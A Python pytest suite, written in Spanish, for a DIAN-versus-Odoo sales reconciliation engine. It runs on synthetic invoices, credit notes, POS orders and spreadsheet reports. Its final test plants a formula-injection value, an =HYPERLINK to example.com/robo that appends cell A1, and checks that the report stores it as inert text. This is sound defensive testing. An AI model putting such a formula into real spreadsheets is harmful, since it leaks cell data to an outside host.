"""
Motor de conciliación de ventas: identificación individual y conciliación global.

Cubre los casos obligatorios del prompt maestro (sección 10) con datos sintéticos.
"""

import io
import json
from datetime import date
from decimal import Decimal

import pytest
from openpyxl import load_workbook

from ventas.motor import _descomponer
from ventas.odoo_ventas import AlcanceInvalido
from ventas.reporte import generar_reporte

D = Decimal


def componente(r, codigo):
    return next(c for c in r.descomposicion["componentes"] if c["codigo"] == codigo)


def metrica(r, codigo):
    return next(m for m in r.metricas if m["codigo"] == codigo)


def assert_cuadra(r):
    """La descomposición explica exactamente la diferencia neta."""
    d = r.descomposicion
    assert d["cuadra"] is True and D(d["residuo"]) == 0
    assert D(d["explicado"]) == D(d["diferencia_neta"])
    assert sum(D(c["monto"]) for c in d["componentes"]) == D(d["diferencia_neta"])


# ──────────────────────────────────────────────
# IDENTIFICACIÓN
# ──────────────────────────────────────────────

def test_totales_identicos(ventas):
    fe1 = ventas.fila("FE", 1, 119000, iva=19000)
    fe2 = ventas.fila("FE", 2, 8000, inc=592.59)
    nc1 = ventas.fila("NC", 1, 5000, tipo="Nota de crédito electrónica")
    odoo = ventas.OdooFalso(movimientos=[
        ventas.movimiento(1, "FE/2026/00001", 119000, impuestos=19000, cufe_valor=fe1["CUFE/CUDE"]),
        ventas.movimiento(2, "FE/2026/00002", 8000, impuestos=592.59, cufe_valor=fe2["CUFE/CUDE"]),
        ventas.movimiento(3, "NC/2026/00001", 5000, tipo="out_refund", cufe_valor=nc1["CUFE/CUDE"]),
    ])
    r = ventas.conciliar([fe1, fe2, nc1], odoo, desde=date(2026, 10, 5), hasta=date(2026, 10, 5))
    assert r.resumen()["por_estado"]["matched"] == 3
    assert {f.metodo for f in r.filas} == {"both"}
    assert D(r.descomposicion["diferencia_neta"]) == 0
    assert D(metrica(r, "total_neto")["dian"]) == D("122000.00")
    assert all(a["ok"] for a in r.alcance), r.alcance
    assert_cuadra(r)


def test_cufe_ausente_en_odoo_y_numero_coincide(ventas):
    fe = ventas.fila("FE", 7, 1000)
    r = ventas.conciliar([fe], ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00007", 1000)]))
    f = r.fila("dian:FE-7")
    assert f.estado == "matched" and f.metodo == "invoice_number"
    assert any("solo por número" in e for e in f.evidencia)


@pytest.mark.parametrize("nombre_odoo", ["FE/2026/00009", "FE-0009", "FE 9", "FE9"])
def test_numero_con_barras_guiones_espacios_y_ceros(ventas, nombre_odoo):
    fe = ventas.fila("FE", "0009", 1000)
    r = ventas.conciliar([fe], ventas.OdooFalso(movimientos=[ventas.movimiento(1, nombre_odoo, 1000)]))
    assert r.fila("dian:FE-9").estado == "matched"


def test_cufe_coincide_y_numero_discordante(ventas):
    fe = ventas.fila("FE", 8, 1000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00009", 1000, cufe_valor=fe["CUFE/CUDE"])])
    f = ventas.conciliar([fe], odoo).fila("dian:FE-8")
    assert f.estado == "identity_mismatch" and f.metodo == "cufe"
    assert any("no es FE-8" in e for e in f.evidencia)


def test_numero_coincide_y_cufe_distinto(ventas):
    fe = ventas.fila("FE", 10, 1000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00010", 1000, cufe_valor=ventas.cufe("otro"))])
    f = ventas.conciliar([fe], odoo).fila("dian:FE-10")
    assert f.estado == "identity_mismatch" and f.metodo == "invoice_number"


def test_mismo_numero_con_nit_emisor_diferente(ventas):
    """El contenedor es de otra empresa: no hay compañía en Odoo con ese NIT."""
    fe = ventas.fila("FE", 1, 1000, nit_emisor="800000002")
    with pytest.raises(AlcanceInvalido):
        ventas.conciliar([fe], ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00001", 1000)]), nit="800000002")


def test_nit_emisor_distinto_a_la_compania_marca_identidad(ventas):
    """Si aun así se concilia contra otra compañía, el mismo número no se da por bueno."""
    fe = ventas.fila("FE", 1, 1000, nit_emisor="800000002")
    r = ventas.conciliar([fe], ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00001", 1000)]))
    assert r.fila("dian:FE-1").estado == "identity_mismatch"
    assert next(a for a in r.alcance if a["codigo"] == "empresa")["ok"] is False


def test_varios_candidatos_por_numero_es_ambiguo(ventas):
    fe = ventas.fila("FE", 11, 1000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00011", 1000)],
                            ordenes=[ventas.orden_pos(5, "FE11", 1000)])
    r = ventas.conciliar([fe], odoo)
    assert r.fila("dian:FE-11").estado == "ambiguous"
    assert r.fila("odoo:account.move:1").estado == "ambiguous"
    assert r.fila("odoo:pos.order:5").estado == "ambiguous"
    assert D(componente(r, "ambiguous")["monto"]) == D("-1000.00")      # 1000 − 1000 − 1000
    assert_cuadra(r)


def test_cufe_repetido_en_odoo_es_posible_duplicado(ventas):
    fe = ventas.fila("FE", 12, 1000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00012", 1000, cufe_valor=fe["CUFE/CUDE"]),
                                         ventas.movimiento(2, "FE/2026/00112", 1000, cufe_valor=fe["CUFE/CUDE"])])
    r = ventas.conciliar([fe], odoo)
    assert r.fila("dian:FE-12").estado == "possible_duplicate"
    assert r.fila("odoo:account.move:2").estado == "possible_duplicate"
    assert_cuadra(r)


def test_prefijos_distintos_no_colisionan(ventas):
    filas = [ventas.fila("FE1", 706, 1000), ventas.fila("FE", 5, 10)]
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/01706", 1000),
                                         ventas.movimiento(2, "FE/2026/00005", 10, cufe_valor=filas[1]["CUFE/CUDE"])])
    r = ventas.conciliar(filas, odoo)
    assert r.fila("dian:FE1-706").estado == "missing_in_odoo"
    assert r.fila("odoo:account.move:1").estado == "missing_in_dian"


# ──────────────────────────────────────────────
# CONCILIACIÓN GLOBAL
# ──────────────────────────────────────────────

def _base(ventas, n=3):
    filas = [ventas.fila("FE", i, 1000 * i) for i in range(1, n + 1)]
    movs = [ventas.movimiento(i, f"FE/2026/{i:05d}", 1000 * i, cufe_valor=filas[i - 1]["CUFE/CUDE"]) for i in range(1, n + 1)]
    return filas, movs


def test_un_documento_faltante_en_odoo(ventas):
    filas, movs = _base(ventas)
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs[:2]))
    assert r.fila("dian:FE-3").estado == "missing_in_odoo"
    assert D(r.descomposicion["diferencia_neta"]) == D("3000.00")
    assert D(componente(r, "missing_in_odoo")["monto"]) == D("3000.00")
    assert_cuadra(r)


def test_un_documento_adicional_en_odoo(ventas):
    filas, movs = _base(ventas)
    movs.append(ventas.movimiento(9, "FE/2026/00009", 777))
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs))
    assert r.fila("odoo:account.move:9").estado == "missing_in_dian"
    assert D(r.descomposicion["diferencia_neta"]) == D("-777.00")
    assert D(componente(r, "missing_in_dian")["monto"]) == D("-777.00")
    assert_cuadra(r)


def test_una_diferencia_de_importe(ventas):
    filas, movs = _base(ventas)
    movs[1]["amount_total"] = 2500.0
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs))
    f = r.fila("dian:FE-2")
    assert f.estado == "amount_mismatch" and f.diferencia_total == D("-500.00")
    assert D(componente(r, "amount_mismatch")["monto"]) == D("-500.00")
    assert_cuadra(r)


def test_diferencia_de_iva_inc(ventas):
    fe = ventas.fila("FE", 1, 11900, iva=1900)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00001", 11900, impuestos=1000, cufe_valor=fe["CUFE/CUDE"])])
    r = ventas.conciliar([fe], odoo)
    f = r.fila("dian:FE-1")
    assert f.estado == "tax_mismatch" and f.diferencia_impuestos == D("900.00")
    assert D(metrica(r, "impuestos")["diferencia"]) == D("900.00")
    assert metrica(r, "iva")["odoo"] is None          # IVA de Odoo solo con mapeo confirmado
    assert D(r.descomposicion["diferencia_neta"]) == 0
    assert_cuadra(r)


def test_nota_credito_con_signo_incorrecto(ventas):
    nc = ventas.fila("NC", 1, 5000, tipo="Nota de crédito electrónica")
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "NC/2026/00001", 5000, tipo="out_invoice", cufe_valor=nc["CUFE/CUDE"])])
    r = ventas.conciliar([nc], odoo)
    f = r.fila("dian:NC-1")
    assert f.estado == "identity_mismatch" and f.componente == "credit_note_treatment"
    assert D(r.descomposicion["diferencia_neta"]) == D("-10000.00")       # −5000 en DIAN, +5000 en Odoo
    assert D(componente(r, "credit_note_treatment")["monto"]) == D("-10000.00")
    assert_cuadra(r)


def test_pos_facturado_no_duplica_el_total(ventas):
    fe = ventas.fila("FE", 20, 5000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00020", 5000, cufe_valor=fe["CUFE/CUDE"])],
                            ordenes=[ventas.orden_pos(5, "POS5", 5000, estado="invoiced", factura=[1, "FE/2026/00020"],
                                                      cufe_valor=fe["CUFE/CUDE"])])
    r = ventas.conciliar([fe], odoo)
    assert r.fila("dian:FE-20").estado == "matched"
    assert D(r.descomposicion["diferencia_neta"]) == 0
    assert r.conjunto.pos_agrupadas == 1


def test_duplicidad_pos_factura_con_cufe_distinto(ventas):
    fe = ventas.fila("FE", 21, 5000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00021", 5000, cufe_valor=fe["CUFE/CUDE"])],
                            ordenes=[ventas.orden_pos(5, "POS5", 5000, factura=[1, "FE/2026/00021"], cufe_valor=ventas.cufe("otro"))])
    r = ventas.conciliar([fe], odoo)
    pos = r.fila("odoo:pos.order:5")
    assert pos.estado == "possible_duplicate" and "doble registro" in pos.evidencia[0]
    assert D(componente(r, "possible_duplicate")["monto"]) == D("-5000.00")
    assert_cuadra(r)


def test_periodos_distintos(ventas):
    dentro = ventas.fila("FE", 30, 1000, fecha="05-10-2026")
    fuera = ventas.fila("FE", 31, 2000, fecha="20-10-2026")
    odoo = ventas.OdooFalso(movimientos=[
        ventas.movimiento(1, "FE/2026/00030", 1000, fecha="2026-09-30", cufe_valor=dentro["CUFE/CUDE"]),
        ventas.movimiento(2, "FE/2026/00099", 700, fecha="2026-09-29"),
    ])
    r = ventas.conciliar([dentro, fuera], odoo)
    f = r.fila("dian:FE-30")
    assert f.estado == "scope_difference" and "fuera del período" in f.evidencia[0]
    assert r.fila("dian:FE-31").estado == "excluded"
    assert r.fila("odoo:account.move:2") is None                 # fuera de alcance: no suma ni aparece como faltante
    assert D(metrica(r, "total_neto")["odoo"]) == 0
    assert_cuadra(r)


def test_contenedor_que_no_cubre_el_periodo(ventas):
    r = ventas.conciliar([ventas.fila("FE", 1, 10, fecha="10-10-2026")], ventas.OdooFalso(),
                         desde=date(2026, 10, 1), hasta=date(2026, 10, 15))
    periodo = next(a for a in r.alcance if a["codigo"] == "periodo")
    assert periodo["ok"] is False and "solo trae documentos" in periodo["detalle"]


def test_documento_de_odoo_posterior_al_corte(ventas):
    fe = ventas.fila("FE", 1, 1000, fecha="14-10-2026", recepcion="2026-10-14T21:00:00")
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00001", 1000, fecha="2026-10-14", cufe_valor=fe["CUFE/CUDE"]),
                                         ventas.movimiento(2, "FE/2026/00002", 300, fecha="2026-10-15")])
    r = ventas.conciliar([fe], odoo)
    f = r.fila("odoo:account.move:2")
    assert f.estado == "scope_difference" and "corte" in f.evidencia[0]
    assert next(a for a in r.alcance if a["codigo"] == "corte")["ok"] is False


def test_cufe_de_un_documento_excluido(ventas):
    dsfr = ventas.fila("DSFR", 4, 300000, tipo="Documento soporte con no obligados")
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "DSFR/2026/00004", 300000, cufe_valor=dsfr["CUFE/CUDE"])])
    r = ventas.conciliar([dsfr, ventas.fila("FE", 1, 10)], odoo)
    f = r.fila("odoo:account.move:1")
    assert f.estado == "scope_difference" and "excluido" in f.evidencia[0]


def test_tolerancia_monetaria_y_redondeo(ventas):
    filas = [ventas.fila("FE", 1, 1000), ventas.fila("FE", 2, 2000), ventas.fila("FE", 3, 3000)]
    movs = [ventas.movimiento(1, "FE/2026/00001", 1000.50, cufe_valor=filas[0]["CUFE/CUDE"]),
            ventas.movimiento(2, "FE/2026/00002", 2001.00, cufe_valor=filas[1]["CUFE/CUDE"]),
            ventas.movimiento(3, "FE/2026/00003", 3001.01, cufe_valor=filas[2]["CUFE/CUDE"])]
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs))
    assert r.fila("dian:FE-1").estado == "matched"                 # 0,50 dentro de $1
    assert r.fila("dian:FE-2").estado == "matched"                 # 1,00 exacto en el límite
    assert r.fila("dian:FE-3").estado == "amount_mismatch"         # 1,01 supera la tolerancia
    assert D(componente(r, "rounding_within_tolerance")["monto"]) == D("-1.50")
    assert D(r.descomposicion["diferencia_neta"]) == D("-2.51")    # la global es exacta: no se tolera
    assert_cuadra(r)


def test_tolerancia_cero(ventas):
    fe = ventas.fila("FE", 1, 1000)
    odoo = ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00001", 1000.01, cufe_valor=fe["CUFE/CUDE"])])
    assert ventas.conciliar([fe], odoo, tolerancia="0").fila("dian:FE-1").estado == "amount_mismatch"


def test_totales_bruto_y_neto_separados(ventas):
    filas = [ventas.fila("FE", 1, 1000), ventas.fila("FE", 2, 2000),
             ventas.fila("ND", 1, 100, tipo="Nota de débito electrónica"),
             ventas.fila("NC", 1, 300, tipo="Nota de crédito electrónica")]
    movs = [ventas.movimiento(1, "FE/2026/00001", 1000, cufe_valor=filas[0]["CUFE/CUDE"]),
            ventas.movimiento(2, "FE/2026/00002", 2000, cufe_valor=filas[1]["CUFE/CUDE"]),
            ventas.movimiento(3, "ND/2026/00001", 100, cufe_valor=filas[2]["CUFE/CUDE"]),
            ventas.movimiento(4, "NC/2026/00001", 300, tipo="out_refund", cufe_valor=filas[3]["CUFE/CUDE"])]
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs))
    assert D(metrica(r, "total_bruto")["dian"]) == D("3100.00")
    assert D(metrica(r, "total_notas_credito")["dian"]) == D("300.00")
    assert D(metrica(r, "total_neto")["dian"]) == D("2800.00")
    assert D(metrica(r, "total_neto")["odoo"]) == D("2800.00")
    assert metrica(r, "cantidad_notas_credito")["dian"] == "1"
    assert_cuadra(r)


def test_residuo_no_explicado_se_informa_y_no_se_fuerza(ventas):
    filas, movs = _base(ventas)
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs[:2]))
    sin_componente = r.fila("dian:FE-3")
    sin_componente.componente = None                     # simula un documento que ningún componente explica
    d = _descomponer(r.filas, r.totales)
    assert d["cuadra"] is False
    assert D(d["residuo"]) == D("3000.00") and D(d["explicado"]) == 0
    assert D(d["diferencia_neta"]) == D("3000.00")


def test_secuencias_por_prefijo(ventas):
    filas = [ventas.fila("FV", i, 100) for i in (1, 2, 3, 7, 8)]
    r = ventas.conciliar(filas, ventas.OdooFalso(ordenes=[ventas.orden_pos(40 + i, f"FV{i}", 100) for i in (4, 5)]))
    s = next(x for x in r.secuencias if x["prefijo"] == "FV")
    assert s["ausentes"] == 3 and s["folios_ausentes"] == [4, 5, 6]
    assert s["bloques"][0]["anterior"]["numero"] == "FV-3" and s["bloques"][0]["siguiente"]["numero"] == "FV-7"
    p = next(x for x in r.prefijos if x["prefijo"] == "FV")
    assert p["ausentes_en_secuencia"] == 3
    assert r.fila("odoo:pos.order:44").estado == "missing_in_dian"


def test_resultado_serializable_y_reporte(ventas):
    filas, movs = _base(ventas)
    movs[0]["amount_total"] = 1200.0
    r = ventas.conciliar(filas, ventas.OdooFalso(movimientos=movs[:2] + [ventas.movimiento(9, "FE/2026/00009", 50)]))
    datos = json.loads(json.dumps(r.a_dict(), ensure_ascii=False))
    assert {"run_id", "resumen", "descomposicion", "metricas", "documentos", "alcance"} <= set(datos)
    json.dumps(r.a_dict(filas_compactas=False), ensure_ascii=False)

    wb = load_workbook(io.BytesIO(generar_reporte(r)))
    assert wb.sheetnames == ["Resumen", "Parámetros", "Global", "Descomposición", "Prefijos", "Secuencias",
                             "Detalle", "Evidencia Odoo", "Hallazgos IA", "Pendientes"]
    assert "No se ejecutó" in wb["Hallazgos IA"]["A3"].value
    pendientes = [c.value for c in wb["Pendientes"]["A"][3:]]
    assert {"Falta en Odoo", "Falta en DIAN", "Diferencia de valor"} <= set(pendientes)


# ──────────────────────────────────────────────
# REGRESIONES DE LA REVISIÓN INDEPENDIENTE
# ──────────────────────────────────────────────

def test_numero_repetido_en_fila_excluida_no_tapa_la_incluida(ventas):
    filas = [ventas.fila("FE", 5, 5000, estado="Rechazado", cufe_valor=ventas.cufe("rechazada")),
             ventas.fila("FE", 5, 5000),
             ventas.fila("FE", 6, 300, grupo="Recibido", cufe_valor=ventas.cufe("de un proveedor")),
             ventas.fila("FE", 6, 500)]
    r = ventas.conciliar(filas, ventas.OdooFalso())
    ids = [f.id for f in r.filas]
    assert len(ids) == len(set(ids))                                   # ids únicos
    assert r.fila("dian:FE-5").estado == "missing_in_odoo"
    assert r.fila("dian:FE-6").estado == "missing_in_odoo"
    assert r.fila("dian:FE-5").dian.incluido and r.fila("dian:FE-6").dian.total == D("500")
    assert sum(r.fila(x).contribucion for x in ("dian:FE-5", "dian:FE-6")) == D("5500.00")
    assert_cuadra(r)


def test_documento_fuera_del_periodo_no_aporta(ventas):
    fuera = ventas.fila("FE", 31, 2000, fecha="01-11-2026")
    r = ventas.conciliar([ventas.fila("FE", 1, 10), fuera], ventas.OdooFalso())
    f = next(x for x in r.filas if x.dian is not None and x.dian.numero.legible == "FE-31")
    assert f.estado == "excluded" and f.componente is None and f.contribucion == 0


def test_numero_repetido_en_el_contenedor_es_posible_duplicado(ventas):
    a = ventas.fila("FE", 7, 700, cufe_valor=ventas.cufe("A"))
    b = ventas.fila("FE", 7, 700, cufe_valor=ventas.cufe("B"))
    r = ventas.conciliar([a, b], ventas.OdooFalso(movimientos=[ventas.movimiento(1, "FE/2026/00007", 700, cufe_valor=a["CUFE/CUDE"])]))
    estados = sorted(f.estado for f in r.filas)
    assert estados == ["matched", "possible_duplicate"]
    dup = next(f for f in r.filas if f.estado == "possible_duplicate")
    assert "repite el número" in dup.evidencia[0]
    assert_cuadra(r)


def test_fuente_pedida_que_no_se_pudo_leer(ventas):
    r = ventas.conciliar([ventas.fila("FE", 1, 10)], ventas.OdooFalso(pos_instalado=False))
    fuentes = next(a for a in r.alcance if a["codigo"] == "fuentes")
    assert fuentes["ok"] is False and "pos.order" in fuentes["detalle"]


def test_secuencia_con_folio_atipico_no_bloquea(ventas):
    import time
    from ventas.secuencias import analizar_secuencias
    from ventas.dian_emitidos import leer_contenedor
    filas = [ventas.fila("FE", 1, 10), ventas.fila("FE", 2, 10), ventas.fila("FE", 990000001, 10)]
    lectura = leer_contenedor(ventas.contenedor(filas), "x.xlsx")
    inicio = time.monotonic()
    s = analizar_secuencias(lectura.incluidos)[0]
    assert time.monotonic() - inicio < 1
    assert s["ausentes"] == 989999998 and s["bloques_totales"] == 1 and len(s["folios_ausentes"]) == 500


def test_reporte_no_ejecuta_formulas_inyectadas(ventas):
    maliciosa = '=HYPERLINK("https://example.com/robo?d="&A1,"Ver soporte")'
    filas = [ventas.fila("FE", 1, 10, nit_receptor="800000002", nombre_receptor=maliciosa)]
    r = ventas.conciliar(filas, ventas.OdooFalso())
    wb = load_workbook(io.BytesIO(generar_reporte(r)))
    celdas = [c for ws in wb.worksheets for fila in ws.iter_rows() for c in fila if c.value == maliciosa]
    assert celdas and all(c.data_type == "s" for c in celdas)
